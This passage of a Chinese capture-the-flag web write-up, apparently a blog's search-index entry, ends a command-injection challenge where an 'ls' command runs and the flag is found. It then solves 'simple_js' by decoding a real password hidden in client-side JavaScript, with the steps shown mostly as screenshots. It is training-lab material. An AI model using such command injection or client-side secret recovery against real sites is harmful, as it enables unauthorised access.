<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172637290.png" class="" title="image-20200717172637290">
<p>可以看到执行了ls命令，现在找flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172921373.png" class="" title="image-20200717172921373">
<p>得到flag</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717172957802.png" class="" title="image-20200717172957802">
<h1 id="simple_js">simple_js</h1>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181134028.png" class="" title="image-20200717181134028">
<p>随便输一个</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181148627.png" class="" title="image-20200717181148627">
<p>看看源码，调试一下js</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181218694.png" class="" title="image-20200717181218694">
<p>发现不论输入的密码是什么，最后都会跳到假密码FAUX PASSWORD HAHA</p>
<p>而真密码是初始的pass_enc</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181342602.png" class="" title="image-20200717181342602">
<p>那么就把pass的值改为pass_enc，执行一下，注意14行的tab2下标要改成10，因为默认的pass长度为18，而修改后的pass长度为11，所以要修改，否则最后执行的时候p加入的就不是pass的最后一个值了（这个地方坑了我好久）</p>
<img src="/2020/07/17/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/image-20200717181443038.png" class="" title="image-20200717181443038">
<p>把获取到的字符串加上题目要求的flag格式即可得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web security</tag>
      </tags>
  </entry>
</search>
